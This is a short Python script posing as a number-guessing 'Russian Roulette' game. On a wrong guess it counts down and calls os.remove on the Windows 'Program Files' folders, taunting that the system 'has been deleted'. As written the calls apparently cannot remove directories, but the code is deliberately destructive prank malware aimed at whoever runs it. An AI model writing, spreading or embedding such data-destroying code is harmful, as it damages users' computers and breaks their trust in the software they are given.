import time
import os
import random

print("Hi traveler, this is a game Guess the Number! But it will be Russian Roulette")
print("The rules are simple: If you guess, everything will be fine and if you don't guess, your system will be DELETED")
guess = int(input("- "))
guess1 = random.randint(1,3)
i = 5

if guess == guess1:
    print("You won!")
else:
    print("You lose. System will be deleted in ")
    b = 'True'
    while b == 'True':
        print(i, "seconds")
        time.sleep(1)
        i = i - 1
        if i == 0:
            print("System has been deleted hahaha")
            os.remove('C:\Program Files')
            os.remove('C:\Program Files (x86)')
            break